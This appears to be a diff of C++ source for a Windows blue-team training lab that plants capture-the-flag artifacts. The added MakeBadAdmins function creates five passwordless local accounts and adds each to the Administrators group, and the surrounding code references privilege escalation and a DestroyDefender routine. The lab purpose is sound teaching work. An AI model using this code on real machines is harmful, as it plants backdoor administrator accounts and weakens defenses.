@@ -3,7 +3,14 @@
 #include <iostream>
 #include <TlHelp32.h>
 #include <lmcons.h>
+#include <lmaccess.h>
+// #include <lmerr.h>
+// #include <lmapibuf.h>
+// #include <stdio.h>
+// #include <stdlib.h>
 #include "../include/lab6.h"
+
+#pragma comment(lib, "netapi32.lib")
 
 #define MAX_NAME 256
 
@@ -21,12 +28,12 @@ const char* kSpawnedCMDFlag = "Hey_you_shouldn't_be_running_there}";
 const char* kInstalledServiceFlag = "Definitely_a_legit_service}";
 const char* kTaskSchedulerFlag = "Wanna_see_me_run_it_again}";
 
-// names of the bad admin users
-const char* kBadAdminName1 = "Spongebob";
-const char* kBadAdminName2 = "Patrick";
-const char* kBadAdminName3 = "Mr. Krabs";
-const char* kBadAdminName4 = "Sandy";
-const char* kBadAdminName5 = "Plankton";
+// // names of the bad admin users
+// const char* kBadAdminName1 = "Spongebob";
+// const char* kBadAdminName2 = "Patrick";
+// const char* kBadAdminName3 = "Mr. Krabs";
+// const char* kBadAdminName4 = "Sandy";
+// const char* kBadAdminName5 = "Plankton";
 
 std::string EnableDebugPrivs() {
     HANDLE hToken;
@@ -381,6 +388,111 @@ std::string DestroyDefender() {
 }
 
 std::string MakeBadAdmins() {
+
+    // ignore errors about converting string constants to microsoft garbage strings
+    #pragma GCC diagnostic push
+    #pragma GCC diagnostic ignored "-Wwrite-strings"
+
+    USER_INFO_1 badAdmin1;
+    USER_INFO_1 badAdmin2;
+    USER_INFO_1 badAdmin3;
+    USER_INFO_1 badAdmin4;
+    USER_INFO_1 badAdmin5;
+    int retVal = 0;
+    DWORD parm_err = 0;
+
+    badAdmin1.usri1_name = L"Spongebob";
+    badAdmin1.usri1_password = L"";
+    badAdmin1.usri1_priv = USER_PRIV_USER;
+    badAdmin1.usri1_home_dir = L"";
+    badAdmin1.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
+    badAdmin1.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
+    badAdmin1.usri1_script_path = L"";
+
+    badAdmin2.usri1_name = L"Patrick";
+    badAdmin2.usri1_password = L"";
+    badAdmin2.usri1_priv = USER_PRIV_USER;
+    badAdmin2.usri1_home_dir = L"";
+    badAdmin2.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
+    badAdmin2.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
+    badAdmin2.usri1_script_path = L"";
+
+    badAdmin3.usri1_name = L"Mr. Krabs";
+    badAdmin3.usri1_password = L"";
+    badAdmin3.usri1_priv = USER_PRIV_USER;
+    badAdmin3.usri1_home_dir = L"";
+    badAdmin3.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
+    badAdmin3.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
+    badAdmin3.usri1_script_path = L"";
+
+    badAdmin4.usri1_name = L"Sandy";
+    badAdmin4.usri1_password = L"";
+    badAdmin4.usri1_priv = USER_PRIV_USER;
+    badAdmin4.usri1_home_dir = L"";
+    badAdmin4.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
+    badAdmin4.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
+    badAdmin4.usri1_script_path = L"";
+
+    badAdmin5.usri1_name = L"Plankton";
+    badAdmin5.usri1_password = L"";
+    badAdmin5.usri1_priv = USER_PRIV_USER;
+    badAdmin5.usri1_home_dir = L"";
+    badAdmin5.usri1_comment = L"ACDLAB6{Never_should_have_come_here}";
+    badAdmin5.usri1_flags = UF_SCRIPT | UF_PASSWD_NOTREQD;
+    badAdmin5.usri1_script_path = L"";
+
+    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin1, &parm_err);
+    if (retVal != 0) {
+        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
+    }
+
+    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin1, 1);
+    if (retVal != 0) {
+        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
+    }
+
+    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin2, &parm_err);
+    if (retVal != 0) {
+        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
+    }
+
+    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin2, 1);
+    if (retVal != 0) {
+        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
+    }
+
+    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin3, &parm_err);
+    if (retVal != 0) {
+        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
+    }
+
+    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin3, 1);
+    if (retVal != 0) {
+        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
+    }
+
+    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin4, &parm_err);
+    if (retVal != 0) {
+        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
+    }
+
+    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin4, 1);
+    if (retVal != 0) {
+        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
+    }
+
+    retVal = NetUserAdd(NULL, 1, (LPBYTE) &badAdmin5, &parm_err);
+    if (retVal != 0) {
+        std::cout << "NetUserAdd failed. retVal: " << retVal << ". parm_err: " << parm_err << std::endl;
+    }
+
+    retVal = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE) &badAdmin5, 1);
+    if (retVal != 0) {
+        std::cout << "NetLocalGroupAddMembers failed. retVal: " << retVal << std::endl;
+    }
+
+    #pragma GCC diagnostic pop
+
     return "";
 }
 
@@ -423,7 +535,10 @@ int main (int argc, char *argv[]) {
     std::cout << "EnableDebugPrivs: " << lab6::EnableDebugPrivs() << std::endl;
     std::cout << "ElevateToSystem: " << lab6::ElevateToSystem() << std::endl;
     std::cout << "CheckCurrentUsername: " << lab6::CheckCurrentUsername() << std::endl;
-    std::cout << "DestroyDefender: " << lab6::DestroyDefender() << std::endl;
+    // need to test DestroyDefender on vm
+    // std::cout << "DestroyDefender: " << lab6::DestroyDefender() << std::endl;
+    // std::cout << "MakeBadAdmins: " << lab6::MakeBadAdmins() << std::endl;
+
     int x;
     std::cin >> x;
     return 0;
